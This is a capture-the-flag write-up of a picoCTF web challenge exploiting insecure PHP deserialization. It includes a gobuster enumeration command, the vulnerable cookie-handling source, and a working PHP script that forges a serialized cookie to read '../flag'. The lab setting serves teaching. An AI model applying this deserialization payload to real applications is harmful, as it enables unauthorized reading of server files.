# URL
https://play.picoctf.org/practice/challenge/180?category=1&difficulty=2&page=2&search=
# Category
Web App Hacking
# Concept
* insecure deserialization
# Method of solve
* there is a number of endpoints we need to discover on this app, including phps pages:
```
gobuster dir -u http://mercury.picoctf.net:8404/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,phps
```
* we discover `authenticate.php`, `authenticate.phps` and `index.php` and `index.phps`
* phps pages are php pages that show their contents and do not execute code
* when we look at the code for the `authenticate.phps` we see the following code
```
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>
```
* this seems to indicate that this page will give you a different message depending on whether the cookie contents includes the is_admin setting set to True
* when we look at the `cookie.phps` page, we see this code
```
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

?>
```
* We see the cookie uses the `unserialize` function, so we can use this code to create a malicious cookie
```
<?php

class access_log {
	public $log_file;
	function __construct($lf) { $this->log_file = $lf; }
	function __toString() { return $this->read_log(); } 
}

$malicious_obj = new access_log("../flag");
$cookie = urlencode(base64_encode(serialize($malicious_obj)));
echo $cookie; // TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9

?>
```
* go to the `authenticate.php` page and set the cookie to the one created by the above code
* upon reload, contents of the flag will be displayed
